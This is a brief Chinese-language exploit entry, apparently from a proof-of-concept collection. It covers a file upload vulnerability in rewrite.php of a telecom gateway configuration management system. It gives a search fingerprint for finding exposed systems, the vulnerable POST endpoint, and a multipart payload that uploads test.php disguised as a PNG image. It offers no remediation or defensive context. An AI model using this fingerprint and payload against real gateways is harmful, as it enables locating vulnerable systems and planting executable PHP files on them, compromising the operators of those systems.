# 电信网关配置管理系统rewrite.php文件上传漏洞

电信网关配置管理系统rewrite.php ｜ 文件上传 ｜ —
- **指纹**：`body="img/login_bg3.png"`
- **请求**：`POST /manager/teletext/material/rewrite.php HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="tmp_name"; filename="test.php"
Content-Type: image/png
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="uploadtime"
------WebKitFormBoundaryOKldnDPT--
```